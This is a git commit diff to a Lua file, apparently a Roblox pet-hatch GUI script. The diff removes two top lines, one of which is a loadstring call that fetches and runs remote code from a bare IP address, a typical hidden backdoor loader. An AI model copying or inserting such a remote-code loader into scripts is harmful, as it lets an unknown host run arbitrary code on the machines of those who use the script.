f6b9f52b94b4e588d0471b1c83ef7e935a0e0bed
VertexScript <j96925425@gmail.com>
2025-09-27 15:10:37 +0800

    Update epd.lua

--- epd.lua
+++ epd.lua
@@ -1,6 +1,3 @@
-ID="edd073e0-949e-44ff-b831-437675610f63";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-
 
 -- ⛏ BIudnyHoIandan VIP Pet Hatch GUI (Dark Theme with White Buttons)
 local Players = game:GetService("Players")
